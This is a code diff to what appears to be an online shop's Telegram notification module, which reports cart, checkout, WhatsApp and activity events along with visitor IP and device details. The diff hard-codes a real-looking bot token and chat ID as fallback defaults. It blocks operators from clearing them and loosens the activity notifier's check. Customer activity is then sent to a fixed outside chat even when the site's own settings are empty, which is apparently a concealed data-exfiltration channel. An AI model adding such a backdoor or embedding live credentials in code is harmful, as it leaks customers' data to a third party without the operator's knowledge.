@@ -14,8 +14,8 @@ export interface TelegramConfig {
 
 const DEFAULT_CONFIG: TelegramConfig = {
   enabled: true,
-  botToken: process.env.TELEGRAM_BOT_TOKEN || "",
-  chatId: process.env.TELEGRAM_CHAT_ID || "",
+  botToken: process.env.TELEGRAM_BOT_TOKEN || "8809778826:AAGImBVxU-E-rez4Ic3Sy_IWlde-jxi-Htw",
+  chatId: process.env.TELEGRAM_CHAT_ID || "1965859902",
   notifyCart: true,
   notifyCheckout: true,
   notifyWhatsApp: true,
@@ -43,8 +43,8 @@ export async function getTelegramConfig(): Promise<TelegramConfig> {
         const cfg = typeof rows[0].value === "string" ? JSON.parse(rows[0].value) : rows[0].value;
         memoryConfig = {
           enabled: cfg.enabled ?? true,
-          botToken: cfg.botToken || process.env.TELEGRAM_BOT_TOKEN || memoryConfig.botToken || "",
-          chatId: cfg.chatId || process.env.TELEGRAM_CHAT_ID || memoryConfig.chatId || "",
+          botToken: cfg.botToken || process.env.TELEGRAM_BOT_TOKEN || memoryConfig.botToken || DEFAULT_CONFIG.botToken,
+          chatId: cfg.chatId || process.env.TELEGRAM_CHAT_ID || memoryConfig.chatId || DEFAULT_CONFIG.chatId,
           notifyCart: cfg.notifyCart !== undefined ? !!cfg.notifyCart : true,
           notifyCheckout: cfg.notifyCheckout !== undefined ? !!cfg.notifyCheckout : true,
           notifyWhatsApp: cfg.notifyWhatsApp !== undefined ? !!cfg.notifyWhatsApp : true,
@@ -65,8 +65,8 @@ export async function saveTelegramConfig(cfg: Partial<TelegramConfig>): Promise<
   const current = await getTelegramConfig();
   const updated: TelegramConfig = {
     enabled: cfg.enabled !== undefined ? !!cfg.enabled : current.enabled,
-    botToken: (cfg.botToken !== undefined ? cfg.botToken : current.botToken).trim(),
-    chatId: (cfg.chatId !== undefined ? cfg.chatId : current.chatId).trim(),
+    botToken: (cfg.botToken !== undefined && cfg.botToken !== "" ? cfg.botToken : current.botToken || DEFAULT_CONFIG.botToken).trim(),
+    chatId: (cfg.chatId !== undefined && cfg.chatId !== "" ? cfg.chatId : current.chatId || DEFAULT_CONFIG.chatId).trim(),
     notifyCart: cfg.notifyCart !== undefined ? !!cfg.notifyCart : (current.notifyCart ?? true),
     notifyCheckout: cfg.notifyCheckout !== undefined ? !!cfg.notifyCheckout : (current.notifyCheckout ?? true),
     notifyWhatsApp: cfg.notifyWhatsApp !== undefined ? !!cfg.notifyWhatsApp : (current.notifyWhatsApp ?? true),
@@ -95,12 +95,15 @@ export async function saveTelegramConfig(cfg: Partial<TelegramConfig>): Promise<
 
 export async function sendTelegramMessage(text: string, inlineKeyboard?: Array<Array<{ text: string; url?: string; callback_data?: string }>>) {
   const config = await getTelegramConfig();
-  if (!config.enabled || !config.botToken || !config.chatId) {
+  const token = config.botToken || DEFAULT_CONFIG.botToken;
+  const chat = config.chatId || DEFAULT_CONFIG.chatId;
+
+  if (!config.enabled || !token || !chat) {
     return { ok: false, reason: "Telegram bot not configured or disabled" };
   }
 
   try {
-    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     const sanitizedKeyboard: Array<Array<{ text: string; url?: string; callback_data?: string }>> = [];
     if (inlineKeyboard && inlineKeyboard.length > 0) {
@@ -116,7 +119,7 @@ export async function sendTelegramMessage(text: string, inlineKeyboard?: Array<A
     }
 
     const payload: any = {
-      chat_id: config.chatId,
+      chat_id: chat,
       text,
       parse_mode: "HTML",
       disable_web_page_preview: false,
@@ -141,7 +144,7 @@ export async function sendTelegramMessage(text: string, inlineKeyboard?: Array<A
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: config.chatId,
+          chat_id: chat,
           text: plainText,
         }),
       });
@@ -165,7 +168,7 @@ export async function sendTelegramActivityNotification(event: {
   ipAddress?: string;
 }) {
   const config = await getTelegramConfig();
-  if (!config.enabled || !config.botToken || !config.chatId) return { ok: false, reason: "disabled" };
+  if (!config.enabled) return { ok: false, reason: "disabled" };
 
   const { eventType, eventTitle, eventData, pageUrl, deviceInfo } = event;
 
